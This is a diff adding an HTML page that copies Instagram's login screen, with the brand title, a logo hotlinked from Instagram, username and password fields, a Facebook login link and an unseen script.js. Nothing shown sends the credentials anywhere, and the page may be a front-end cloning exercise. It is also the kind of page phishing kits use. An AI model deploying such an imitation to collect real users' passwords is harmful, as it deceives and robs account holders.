@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <div class="instagram-logo">
+                <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram">
+            </div>
+            
+            <form id="loginForm">
+                <div class="form-group">
+                    <input 
+                        type="text" 
+                        id="username" 
+                        placeholder="Phone number, username or email" 
+                        required
+                    >
+                </div>
+                
+                <div class="form-group">
+                    <input 
+                        type="password" 
+                        id="password" 
+                        placeholder="Password" 
+                        required
+                    >
+                </div>
+                
+                <button type="submit" class="login-btn">Log in</button>
+            </form>
+            
+            <div class="divider">OR</div>
+            
+            <div class="facebook-login">
+                <a href="#" id="facebookLogin">
+                    <span>Log in with Facebook</span>
+                </a>
+            </div>
+            
+            <a href="#" class="forgot-password">Forgot password?</a>
+        </div>
+        
+        <div class="signup-box">
+            <p>Don't have an account? <a href="signup.html">Sign up</a></p>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
